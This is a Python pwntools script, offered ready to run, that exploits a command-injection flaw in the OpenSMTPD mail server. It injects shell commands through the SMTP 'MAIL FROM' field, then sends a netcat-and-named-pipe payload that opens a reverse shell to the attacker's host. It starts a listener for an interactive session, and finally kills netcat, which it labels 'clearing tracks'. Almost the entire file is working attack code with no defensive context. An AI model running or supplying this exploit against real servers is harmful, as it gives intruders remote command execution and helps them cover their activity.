#!/usr/bin/python3
from pwn import *

# Cehcking 
if len(sys.argv) != 5:
    print("Usage {} LHOST LPORT RHOST RPORT".format(sys.argv[0]))
    print("E.g. {} 192.158.0.2 8080 192.168.0.3 25".format(sys.argv[0]))
    sys.exit(1)

LHOST = sys.argv[1]
LPORT = int(sys.argv[2])
RHOST = sys.argv[3]
RPORT = int(sys.argv[4])

try:
    p = remote(RHOST, RPORT, timeout=4)
    res = p.recvline()
    # Checking OpenSMTPD
    if 'OpenSMTPD' not in str(res):
        p.error("[!] No OpenSMTPD detected")

    p.sendline("HELO xx")
    res = p.recvline()
    # Checking reply code
    if '250' not in str(res):
        p.error(res)
    
    # Sending exploit
    stat = log.progress("Sending exloit")
    stat.status('In progress')
    p.sendline("MAIL FROM:<;for i in r j A F L X;do read;done;sh;exit 0;>")
    res = p.recvline()
    # Checking reply code
    if '250' not in str(res):
        p.error(res)

    p.sendline("RCPT TO:<root>")
    res = p.recvline()
    # Checking reply code
    if '250' not in str(res):
        p.error(res)

    p.sendline("DATA")
    res = p.recvline()
    # Checking reply code
    if '354' not in str(res):
        p.error(res)
    stat.success("Done")

    # Sending payload
    stat = log.progress("Sending payload")
    stat.status('In progress')
    p.sendline("\r\n\r\n#\r\n#\r\n#\r\n#\r\n#\r\n#\r\n#\r\n#\r\n#\r\n#\r\n#\r\n#\r\n#\r\n#\r\n")
    p.sendline("mkfifo /tmp/nnwo; nc {} {} 0</tmp/nnwo | /bin/sh >/tmp/nnwo 2>&1; rm /tmp/nnwo\r\n.".format(LHOST, LPORT))
    stat.success('Done')

    # start server
    l = server(LPORT)
    s = l.next_connection()
    s.interactive()
except Exception as e:
    info("No luck!! Try again...")
finally:
    if 's' in locals():
        stat = log.progress("Clearing tracks")
        stat.status('In progress')
        s.sendline("pkill nc")
        stat.success('Done')
    if 'p' in locals():
        p.close()
